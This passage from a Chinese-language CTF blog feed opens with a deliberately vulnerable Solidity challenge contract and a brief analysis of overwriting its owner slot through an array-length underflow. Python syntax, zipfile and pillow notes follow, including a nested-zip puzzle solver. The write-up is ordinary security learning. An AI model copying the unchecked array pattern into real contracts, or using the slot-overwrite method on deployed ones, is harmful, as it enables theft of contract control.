data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.24</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">ArrayTest</span>  <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>    <span class="token builtin">bool</span> <span class="token keyword">public</span> contact<span class="token punctuation">;</span>    <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">public</span> codex<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">record</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _content<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        codex<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>_content<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">retract</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        codex<span class="token punctuation">.</span>length<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">revise</span><span class="token punctuation">(</span><span class="token builtin">uint</span> i<span class="token punctuation">,</span> <span class="token builtin">bytes32</span> _content<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        codex<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> _content<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="analyse"><a class="markdownIt-Anchor" href="#analyse"></a> Analyse</h5><p>数组codex 为slot1，实际内容存在keccak256(1)开始的位置。</p><p>x=keccak256(bytes32(1)))</p><p>要想修改owner即要修改slot0，storage一共2^256个位置，因此需要修改codex[y]就等于修改owner。其中y=2 ^256-x。</p><p>于此同时数组的长度还是要大于y的，但是retract()可以实现下溢。</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 语法知识</title>
      <link href="/2023/10/31/Python-%E8%AF%AD%E6%B3%95%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/10/31/Python-%E8%AF%AD%E6%B3%95%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h3 id="切片"><a class="markdownIt-Anchor" href="#切片"></a> 切片</h3><p>一个完整的切片是包含三个参数和两个冒号&quot; : &quot; ,用于分隔三个参数(start_index、end_index、step)。</p><h3 id="find"><a class="markdownIt-Anchor" href="#find"></a> find</h3><p>string.find( str, start, end)</p><ul><li>str ：（必选）指定需要检测的字符串</li><li>start ：（可选）开始索引，默认为0 <code>start = 0</code></li><li>end ：（可选）结束索引，默认为字符串的长度 <code>end = len(string)</code></li><li>如果「包含」字符串，就返回字符串的索引</li><li>如果「不包含」字符串，就返回 -1</li></ul><h3 id="lambda"><a class="markdownIt-Anchor" href="#lambda"></a> lambda</h3><p>lambda 表达式也叫做<strong>匿名函数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">fun <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>fun<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="正则表达式"><a class="markdownIt-Anchor" href="#正则表达式"></a> 正则表达式</h3><h4 id="match"><a class="markdownIt-Anchor" href="#match"></a> match</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> string<span class="token punctuation">)</span><span class="token comment"># pattern     匹配的正则表达式</span><span class="token comment"># string      要匹配的字符串</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="单字符匹配20211001104058570"><a class="markdownIt-Anchor" href="#单字符匹配20211001104058570"></a> 单字符匹配<img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030927613.png" alt="20211001104058570"></h5><p>[^2345] 不匹配2345中的任意一个</p><p>[a-z3-5] 匹配a-z或者3-5中的字符</p><h5 id="表示数量"><a class="markdownIt-Anchor" href="#表示数量"></a> 表示数量</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030927615.png" alt="20211001112641902"></p><h5 id="匹配边界"><a class="markdownIt-Anchor" href="#匹配边界"></a> 匹配边界</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030927616.png" alt="20211001120752216"></p><h5 id="匹配分组"><a class="markdownIt-Anchor" href="#匹配分组"></a> 匹配分组</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030927617.png" alt="20211001181501339"></p><h4 id="search"><a class="markdownIt-Anchor" href="#search"></a> search</h4><p>match差不多用法，从字符串中进行搜索</p><h4 id="findall"><a class="markdownIt-Anchor" href="#findall"></a> findall</h4><p>从字面意思上就可以看到，findall是寻找所有能匹配到的字符，并以列表的方式返回</p><h4 id="split"><a class="markdownIt-Anchor" href="#split"></a> split</h4><p>对字符串进行分割，并返回一个列表</p><h3 id="列表与元组"><a class="markdownIt-Anchor" href="#列表与元组"></a> 列表与元组</h3><h4 id="列表"><a class="markdownIt-Anchor" href="#列表"></a> 列表</h4><p>列表所有元素都放在[]，中</p><p>使用append对列表进行更新</p><p>del删除列表中元素</p><h5 id="常用方法"><a class="markdownIt-Anchor" href="#常用方法"></a> 常用方法</h5><p>count()</p><p>统计某个元素出现的次数</p><p>index()</p><p>查找某个元素再列表中首次出现的位置，即索引‘</p><p>remove()</p><p>一处某个值的首次匹配项</p><p>sort()</p><p>对列表中的元素进行排序</p><p>copy()</p><p>复制列表</p><h4 id="元组"><a class="markdownIt-Anchor" href="#元组"></a> 元组</h4><p>所有元素放在（）中</p><p>元组中元素不能被修改，我们需要重新赋值，同理也只能删除整个元组</p><h5 id="常用方法-2"><a class="markdownIt-Anchor" href="#常用方法-2"></a> 常用方法</h5><p>len()</p><p>max(),min()</p><p>tuple()</p><p>将列表转为元组</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">l<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">]</span>t<span class="token operator">=</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>得到<span class="token punctuation">(</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python zip</title>
      <link href="/2023/10/31/Python-zip/"/>
      <url>/2023/10/31/Python-zip/</url>
      
        <content type="html"><![CDATA[<h3 id="zipfile"><a class="markdownIt-Anchor" href="#zipfile"></a> <strong>zipfile</strong></h3><h4 id="常用模块"><a class="markdownIt-Anchor" href="#常用模块"></a> 常用模块</h4><h5 id="zipfile-2"><a class="markdownIt-Anchor" href="#zipfile-2"></a> ZipFile</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfilef <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token keyword">case</span><span class="token punctuation">.</span><span class="token builtin">zip</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token comment">#以可读方式创建一个ZipFile对象</span>f_name <span class="token operator">=</span> f<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取zip对象内所有文件的名称列表</span>f_info <span class="token operator">=</span> f<span class="token punctuation">.</span>getinfo<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token comment">#获取zip对象内指定文件的信息</span>f_infolist <span class="token operator">=</span> f<span class="token punctuation">.</span>infolist<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取zip对象内所有文件的信息，返回列表</span>f<span class="token punctuation">.</span>extract<span class="token punctuation">(</span>name<span class="token punctuation">,</span> path<span class="token punctuation">,</span> pwd<span class="token punctuation">)</span> <span class="token comment">#解压zip对象内指定文件到指定路径中，密码为pwd</span>f<span class="token punctuation">.</span>printdir<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#将zip对象内的信息打印到控制台上</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="zipinfo"><a class="markdownIt-Anchor" href="#zipinfo"></a> Zipinfo</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token punctuation">,</span> oszipFile <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'duoduo.zip'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>zipInfo <span class="token operator">=</span> zipFile<span class="token punctuation">.</span>getinfo<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span> <span class="token comment">#zip对象内的文件</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'filename:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>  <span class="token comment">#获取文件名称</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'date_time:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>date_time<span class="token punctuation">)</span>   <span class="token comment">#获取文件最后修改时间。返回一个包含6个元素的元组：(年, 月, 日, 时, 分, 秒)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'compress_type:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>compress_type<span class="token punctuation">)</span> <span class="token comment">#压缩类型</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'comment:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>comment<span class="token punctuation">)</span>   <span class="token comment">#文档说明</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'extra:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>extra<span class="token punctuation">)</span>    <span class="token comment">#扩展项数据</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'create_system:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>create_system<span class="token punctuation">)</span> <span class="token comment">#获取创建该zip文档的系统。</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'create_version:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>create_version<span class="token punctuation">)</span> <span class="token comment">#获取 创建zip文档的PKZIP版本。</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'extract_version:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>extract_version<span class="token punctuation">)</span> <span class="token comment">#获取 解压zip文档所需的PKZIP版本。</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'extract_version:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>reserved<span class="token punctuation">)</span> <span class="token comment"># 预留字段，当前实现总是返回0。</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'flag_bits:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>flag_bits<span class="token punctuation">)</span> <span class="token comment">#zip标志位。</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'volume:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>volume<span class="token punctuation">)</span> <span class="token comment"># 文件头的卷标。</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'internal_attr:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>internal_attr<span class="token punctuation">)</span> <span class="token comment">#内部属性。</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'external_attr:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>external_attr<span class="token punctuation">)</span> <span class="token comment">#外部属性。</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'header_offset:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>header_offset<span class="token punctuation">)</span> <span class="token comment"># 文件头偏移位。</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'CRC:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>CRC<span class="token punctuation">)</span> <span class="token comment"># 未压缩文件的CRC-32。</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'compress_size:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>compress_size<span class="token punctuation">)</span> <span class="token comment">#获取压缩后的大小。</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'file_size:'</span><span class="token punctuation">,</span> zipInfo<span class="token punctuation">.</span>file_size<span class="token punctuation">)</span> <span class="token comment">#获取未压缩的文件大小。</span>zipFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h3><h4 id="gdouctf-2023matryoshka"><a class="markdownIt-Anchor" href="#gdouctf-2023matryoshka"></a> [GDOUCTF 2023]Matryoshka</h4><p>本题是一个压缩包套娃。</p><p>password1000.txt与Matryoshka1000.zip</p><p>其中每一层数字进行递减</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">eightfivezeroninefivetwosevenplusonesevenzerosevenfoursevensevenfourtwoplusfouronezerothreethreezerotimesthreefiveonesixfiveseveneighteightsevenplusfiveonesevennineonefivethreeeight<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>密码为算出的结果。但是密码文件的运算逻辑不是平常做的那种。而是，固定下来，从左往右进行运算</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">get_password</span><span class="token punctuation">(</span>next_password_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>next_password_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    replace_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"zero"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"one"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"two"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"three"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                    <span class="token punctuation">[</span><span class="token string">"four"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"five"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"six"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"seven"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                    <span class="token punctuation">[</span><span class="token string">"eight"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"nine"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"plus"</span><span class="token punctuation">,</span> <span class="token string">"+"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"times"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                    <span class="token punctuation">[</span><span class="token string">"minus"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"mod"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> re_list <span class="token keyword">in</span> replace_list<span class="token punctuation">:</span>        data <span class="token operator">=</span> data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>re_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> re_list<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    nums <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"\d&#123;1,&#125;"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token operator">//</span>匹配所有数字    valid_nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> num <span class="token keyword">in</span> nums<span class="token punctuation">:</span>        valid_nums<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> valid_nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">//</span>将数字转化为字符串，并将其添加到对应的位置    list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">]</span>    count_s <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> l <span class="token keyword">in</span> list1<span class="token punctuation">:</span>        counts <span class="token operator">=</span> data<span class="token punctuation">.</span>count<span class="token punctuation">(</span>l<span class="token punctuation">)</span>        count_s <span class="token operator">+=</span> counts    data <span class="token operator">=</span> <span class="token string">'('</span> <span class="token operator">*</span> count_s <span class="token operator">+</span> data    list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">')+'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">')-'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">')*'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">')%'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> li <span class="token keyword">in</span> list2<span class="token punctuation">:</span>        data <span class="token operator">=</span> data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>li<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> li<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> password<span class="token keyword">def</span> <span class="token function">zip_file</span><span class="token punctuation">(</span>next_zip<span class="token punctuation">,</span> password<span class="token punctuation">,</span> next_password_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    zf <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>next_zip<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>    name_list <span class="token operator">=</span> zf<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span>    zf<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>path<span class="token operator">=</span><span class="token string">'.'</span><span class="token punctuation">,</span> pwd<span class="token operator">=</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    zf<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>next_password_file<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>next_zip<span class="token punctuation">)</span>    next_password_file<span class="token punctuation">,</span> next_zip <span class="token operator">=</span> name_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name_list<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> next_password_file<span class="token punctuation">,</span> next_zip<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    next_password_file <span class="token operator">=</span> <span class="token string">'password1000.txt'</span>    next_zip <span class="token operator">=</span> <span class="token string">'Matryoshka1000.zip'</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            password <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>get_password<span class="token punctuation">(</span>next_password_file<span class="token punctuation">)</span><span class="token punctuation">)</span>            next_password_file<span class="token punctuation">,</span> next_zip <span class="token operator">=</span> zip_file<span class="token punctuation">(</span>next_zip<span class="token punctuation">,</span> password<span class="token punctuation">,</span> next_password_file<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h3><p><a href="https://www.cnblogs.com/ManyQian/p/9193199.html">https://www.cnblogs.com/ManyQian/p/9193199.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 图像处理</title>
      <link href="/2023/10/30/Python-%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"/>
      <url>/2023/10/30/Python-%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="pillow"><a class="markdownIt-Anchor" href="#pillow"></a> pillow</h3><p>图片通常使用pillow库进行操作。</p><h4 id="常用模块"><a class="markdownIt-Anchor" href="#常用模块"></a> 常用模块</h4><h5 id="image"><a class="markdownIt-Anchor" href="#image"></a> Image</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagepic <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span>RGB<span class="token punctuation">,</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#新建一个图片文件</span><span class="token comment">#不写颜色数据则默认为(0, 0, 0)</span>pic <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>png<span class="token punctuation">)</span> <span class="token comment">#打开一个图片文件</span>pic <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>png<span class="token punctuation">)</span><span class="token punctuation">.</span>convert<span class="token punctuation">(</span>L<span class="token punctuation">)</span> <span class="token comment">#以灰度模式打开一个图片文件</span>width<span class="token punctuation">,</span> height <span class="token operator">=</span> pic<span class="token punctuation">.</span>size <span class="token comment">#获取图片的宽高</span>pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#对(x,y)坐标的像素点填充颜色，左上角坐标为(0, 0)</span>pic<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#用默认图片软件展示图片</span>pic<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#保存图片，可写路径，默认与python文件同路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提取一部分</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pic_1<span class="token operator">=</span>pic<span class="token punctuation">.</span>crop<span class="token punctuation">(</span>x1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>y1<span class="token punctuation">,</span>y2<span class="token punctuation">)</span><span class="token comment">#前面为左上坐标，后边为右下角坐标</span><span class="token comment">#一张照片分为多块保存。</span>a<span class="token operator">=</span><span class="token number">30</span>b<span class="token operator">=</span><span class="token number">45</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        box<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">*</span>a<span class="token punctuation">,</span>y<span class="token operator">*</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span>y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>b<span class="token punctuation">)</span>        f<span class="token operator">=</span>image<span class="token punctuation">.</span>crop<span class="token punctuation">(</span>box<span class="token punctuation">)</span><span class="token comment">#每块碎片为30*45</span>        f<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 